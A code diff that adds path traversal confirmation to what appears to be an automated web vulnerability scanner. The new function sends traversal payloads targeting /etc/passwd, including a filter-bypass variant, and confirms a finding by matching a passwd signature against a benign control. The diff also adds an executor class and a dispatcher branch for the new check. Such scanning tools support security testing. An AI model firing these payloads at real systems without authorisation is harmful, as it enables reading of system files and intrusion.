@@ -15,6 +15,7 @@ than an LLM. The LLM is better placed as a later triage/decision layer, not the 
 from __future__ import annotations
 
 import json
+import re
 import secrets
 from pathlib import Path
 from urllib.parse import urlencode
@@ -110,6 +111,47 @@ def confirm_cmdi(session, endpoint, param, method, ev_dir, blind_delay=1.0):
             "payload": None, "proof": None, "false_positive_reason": None, "files": files}
 
 
+PASSWD_RE = re.compile(r"root:.*:0:0:")
+
+
+def confirm_path_traversal(session, endpoint, param, method, ev_dir, benign="welcome.txt"):
+    """Send a benign control, then traversal payloads targeting /etc/passwd. Confirm only if
+    the passwd signature appears for a payload and NOT for the benign control."""
+    method = method.upper()
+
+    def send(value):
+        if method == "POST":
+            return session.post(endpoint, data={param: value})
+        return session.get(endpoint + "?" + urlencode({param: value}))
+
+    payloads = ["../../../../../../etc/passwd",
+                "....//....//....//....//....//....//etc/passwd"]
+    control = send(benign)
+    files = save_evidence(ev_dir, "control-benign", control)
+    control_leak = bool(PASSWD_RE.search(control.body))
+
+    statuses = []
+    for p in payloads:
+        r = send(p)
+        statuses.append(r.status)
+        if PASSWD_RE.search(r.body) and not control_leak:
+            files += save_evidence(ev_dir, "traversal", r)
+            return {"status": "confirmed", "severity": "high", "endpoint": endpoint,
+                    "payload": f"{param}={p}",
+                    "proof": "Response contained /etc/passwd (line matching root:...:0:0:), "
+                             "absent from the benign control.",
+                    "false_positive_reason": None, "files": files}
+        last = r
+    files += save_evidence(ev_dir, "traversal", last)
+    if all(s in (400, 401, 403, 404) for s in statuses):
+        return {"status": "false-positive", "severity": None, "endpoint": endpoint,
+                "payload": None, "proof": None,
+                "false_positive_reason": f"traversal rejected/sanitized (statuses {statuses})",
+                "files": files}
+    return {"status": "unconfirmed", "severity": None, "endpoint": endpoint,
+            "payload": None, "proof": None, "false_positive_reason": None, "files": files}
+
+
 def _finding(fid, hyp, res, requests_used):
     return {"id": fid, "hypothesis_id": hyp["id"], "class": hyp["class"],
             "status": res["status"], "endpoint": res["endpoint"],
@@ -183,6 +225,32 @@ class HttpCmdiExecutors:
         return SimulationExecutors({}).report(store)
 
 
+class HttpPathTraversalExecutors:
+    def __init__(self, base_url, endpoint, param, method="GET", benign="welcome.txt"):
+        self.base, self.endpoint, self.param = base_url, endpoint, param
+        self.method, self.benign = method.upper(), benign
+
+    def recon(self, store, urls, objective):
+        hyp = {"id": "H-001", "endpoint": self.endpoint, "method": self.method,
+               "parameter": self.param, "class": "PATH-TRAVERSAL", "confidence": "medium",
+               "reason": f"Parameter '{self.param}' may reference a file path.", "status": "open"}
+        _save(store.dir / "recon" / "hypotheses.json", [hyp])
+        return {"requests_used": 0}
+
+    def hunt(self, store, hyp, urls):
+        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
+        ev_dir = store.dir / "findings" / "evidence" / fid
+        s = Session(self.base)
+        res = confirm_path_traversal(s, self.endpoint, self.param, self.method, ev_dir,
+                                     benign=self.benign)
+        _save(store.dir / "findings" / f"{fid}.json", _finding(fid, hyp, res, s.request_count))
+        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
+                "status": res["status"], "requests_used": s.request_count}
+
+    def report(self, store):
+        return SimulationExecutors({}).report(store)
+
+
 # --------------------------------------------------------------------------- autonomous
 
 class DynamicExecutors:
@@ -235,6 +303,9 @@ class DynamicExecutors:
         elif hyp["class"] == "CMDI":
             res = confirm_cmdi(s, hyp["endpoint"], hyp["parameter"],
                                hyp.get("method", "GET"), ev_dir)
+        elif hyp["class"] in ("PATH-TRAVERSAL", "PATH_TRAVERSAL"):
+            res = confirm_path_traversal(s, hyp["endpoint"], hyp["parameter"],
+                                         hyp.get("method", "GET"), ev_dir)
         else:
             res = {"status": "unconfirmed", "severity": None, "endpoint": hyp["endpoint"],
                    "payload": None, "proof": None, "false_positive_reason": None, "files": []}
